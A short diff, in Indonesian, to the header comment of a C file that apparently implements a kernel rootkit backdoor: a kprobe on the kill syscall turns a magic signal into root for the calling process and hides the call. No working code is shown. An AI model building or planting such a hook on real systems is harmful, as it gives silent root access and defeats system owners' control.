@@ -2,7 +2,7 @@
  * hook_kill.c — LPE via sinyal magic (kprobe pada __x64_sys_kill).
  *
  * Konsep (gaya bds "kill000" / Diamorphine "kill -64"):
- *   user menjalankan:  kill -s63 1
+ *   user menjalankan:  kill -s 63 1
  *   hook menangkap SEBELUM syscall dieksekusi:
  *     - grant root ke proses PEMANGGIL (current), BUKAN pid tujuan
  *     - ubah argumen jadi kill(pid, 0) -> ceksaja, tidak berbahaya
